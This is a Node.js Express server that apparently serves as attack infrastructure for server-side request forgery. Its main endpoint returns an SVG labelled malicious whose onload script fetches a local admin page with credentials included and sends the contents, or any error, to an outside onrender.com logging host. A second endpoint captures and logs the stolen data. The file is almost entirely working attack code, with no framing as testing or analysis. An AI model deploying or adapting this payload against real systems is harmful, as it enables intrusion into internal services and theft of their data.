const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Main malicious image endpoint
app.get('/malicious-image.svg', (req, res) => {
  console.log('SVG request received:', {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: req.headers,
    ip: req.ip
  });

  // Malicious SVG with SSRF payload
  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="
  try {
    fetch('http://localhost:8080/admin', {credentials: 'include'})
      .then(response => response.text())
      .then(data => {
        fetch('https://ssrf-sbc4.onrender.com/log?data=' + encodeURIComponent(data.slice(0, 500)))
      })
      .catch(error => {
        fetch('https://ssrf-sbc4.onrender.com/log?error=' + encodeURIComponent(error.message))
      });
  } catch(e) {}
">
  <rect width="100" height="100" fill="red"/>
  <text x="50" y="50" text-anchor="middle" fill="white" font-size="12">SSRF</text>
</svg>`;

  res.setHeader('Content-Type', 'image/svg+xml');
  res.setHeader('Cache-Control', 'no-store');
  res.send(svgPayload);
});

// Log endpoint to capture SSRF results
app.get('/log', (req, res) => {
  console.log('SSRF DATA CAPTURED:', {
    timestamp: new Date().toISOString(),
    query: req.query,
    headers: req.headers,
    ip: req.ip
  });

  res.json({ 
    status: 'success', 
    message: 'Data logged successfully',
    received: req.query 
  });
});

// Redirect endpoint (for other requests)
app.get('*', (req, res) => {
  console.log('Redirect request:', {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: req.headers
  });

  res.redirect(302, 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj48cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgZmlsbD0icmVkIi8+PHRleHQgeD0iNTAiIHk9IjUwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+U1NSRjwvdGV4dD48L3N2Zz4=');
});

app.listen(PORT, () => {
  console.log(`SSRF server running on port ${PORT}`);
  console.log(`Access your malicious image at: https://ssrf-sbc4.onrender.com/malicious-image.svg`);
});
